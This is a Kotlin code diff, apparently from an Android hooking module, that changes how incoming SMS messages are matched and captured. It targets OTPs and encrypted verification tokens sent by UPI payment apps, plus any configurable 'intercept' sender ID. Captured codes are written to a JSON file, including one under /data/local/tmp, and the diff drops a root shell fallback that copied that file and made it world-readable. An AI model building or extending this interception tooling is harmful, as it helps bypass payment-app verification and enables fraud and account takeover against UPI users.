@@ -8,55 +8,67 @@ object SmsMatcher {
 
     private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
 
+    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
+        UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
+
     fun shouldCapture(config: ModuleConfig, sender: String, body: String): Boolean {
         if (!config.hookIncomingSms && !config.hookUpiVerification) return false
-        if (body.isBlank()) return false
+        if (body.isBlank() || sender.isBlank()) return false
 
-        val matchedApp = UpiAppRegistry.matchApp(sender, body)
+        val hooked = enabledHookedApps(config)
+        if (hooked.isEmpty()) return false
 
-        if (config.hookUpiVerification) {
-            if (matchedApp != null) {
-                return config.hookedUpiApps[matchedApp.packageName] ?: false
-            }
-            return isLikelyVerificationSms(sender, body)
+        // Custom intercept sender ID from MESSAGE tab
+        val filterSender = config.injectSenderId.trim()
+        if (filterSender.isNotBlank() && filterSender != "AD-TEST-S") {
+            if (senderMatches(sender, filterSender)) return true
         }
 
-        if (config.hookIncomingSms) {
-            if (matchedApp != null) {
-                return config.hookedUpiApps[matchedApp.packageName] ?: true
-            }
-            return isLikelyVerificationSms(sender, body)
+        val matchedHooked = UpiAppRegistry.matchAmong(hooked, sender, body)
+        if (matchedHooked != null) return true
+
+        if (config.hookUpiVerification && isVerificationSms(sender, body)) {
+            return true
         }
-        return false
+
+        return config.hookIncomingSms && matchedHooked != null
     }
+
+    fun senderMatches(actual: String, filter: String): Boolean {
+        val a = normalizeSender(actual)
+        val f = normalizeSender(filter)
+        if (a.isBlank() || f.isBlank()) return false
+        return a == f || a.contains(f) || f.contains(a)
+    }
+
+    fun normalizeSender(sender: String): String =
+        sender.replace("\\s".toRegex(), "").uppercase()
 
     fun extractToken(body: String, autoExtract: Boolean): String {
         val trimmed = body.trim()
         if (trimmed.isEmpty()) return ""
-
-        // YesPay / YesPro style encrypted token (multiline alphanumeric)
         if (isEncryptedToken(trimmed)) return trimmed
-
         if (!autoExtract) return trimmed
 
         val matcher = OTP_PATTERN.matcher(trimmed)
         if (matcher.find()) {
             val digits = matcher.group(1) ?: trimmed
-            // Prefer full body when OTP regex matched tiny substring inside token
-            if (isEncryptedToken(trimmed) || digits.length < 6 && trimmed.length > 20) {
-                return trimmed
-            }
+            if (digits.length < 6 && trimmed.length > 20) return trimmed
             return digits
         }
         return trimmed
     }
 
-    fun messageLabel(sender: String, body: String): String {
-        UpiAppRegistry.matchApp(sender, body)?.let { return it.displayName.uppercase() }
+    fun messageLabel(config: ModuleConfig, sender: String, body: String): String {
+        val hooked = enabledHookedApps(config)
+        UpiAppRegistry.matchAmong(hooked, sender, body)?.let { return it.displayName.uppercase() }
+        UpiAppRegistry.matchApp(sender, body)?.let { app ->
+            if (config.hookedUpiApps[app.packageName] == true) return app.displayName.uppercase()
+        }
         return formatSenderLabel(sender)
     }
 
-    private fun isEncryptedToken(text: String): Boolean {
+    fun isEncryptedToken(text: String): Boolean {
         if (text.length < 24) return false
         val compact = text.replace("\\s".toRegex(), "")
         if (compact.length < 20) return false
@@ -64,7 +76,8 @@ object SmsMatcher {
         return tokenChars >= compact.length * 0.85
     }
 
-    private fun isLikelyVerificationSms(sender: String, body: String): Boolean {
+    private fun isVerificationSms(sender: String, body: String): Boolean {
+        if (isEncryptedToken(body)) return true
         val upperSender = sender.uppercase()
         val upperBody = body.uppercase()
         val keywords = listOf(
@@ -73,7 +86,6 @@ object SmsMatcher {
         )
         if (keywords.any { upperBody.contains(it) || upperSender.contains(it) }) return true
         if (upperSender.startsWith("AD-") || upperSender.startsWith("VM-")) return true
-        if (isEncryptedToken(body)) return true
         if (sender.replace("\\D".toRegex(), "").length >= 8) return true
         return false
     }
@@ -81,13 +93,11 @@ object SmsMatcher {
     private fun formatSenderLabel(sender: String): String {
         var label = sender.trim()
         listOf("AD-", "VM-", "JD-", "BP-", "TX-").forEach { prefix ->
-            if (label.startsWith(prefix, ignoreCase = true)) {
-                label = label.substring(prefix.length)
-            }
+            if (label.startsWith(prefix, ignoreCase = true)) label = label.substring(prefix.length)
         }
         label = label.trim('-', ' ')
         if (label.endsWith("-S", ignoreCase = true)) label = label.dropLast(2)
-        return label.uppercase().ifBlank { "SMS VERIFY" }
+        return label.uppercase().ifBlank { "INTERCEPT" }
     }
 }
 
@@ -104,24 +114,15 @@ object OtpCaptureWriter {
             put("captured_at", System.currentTimeMillis())
         }
         val payload = json.toString()
+        val appDir = context.getExternalFilesDir(null) ?: context.filesDir
 
         try {
-            val appDir = context.getExternalFilesDir(null) ?: context.filesDir
             appDir.mkdirs()
             java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
         } catch (_: Exception) {}
 
         try {
             java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
-        } catch (_: Exception) {
-            try {
-                Runtime.getRuntime().exec(
-                    arrayOf(
-                        "su", "-c",
-                        "cp '${(context.getExternalFilesDir(null) ?: context.filesDir).absolutePath}/${ConfigManager.APP_OTP_NAME}' /data/local/tmp/hivirtus_last_otp.json && chmod 644 /data/local/tmp/hivirtus_last_otp.json"
-                    )
-                )
-            } catch (_: Exception) {}
-        }
+        } catch (_: Exception) {}
     }
 }
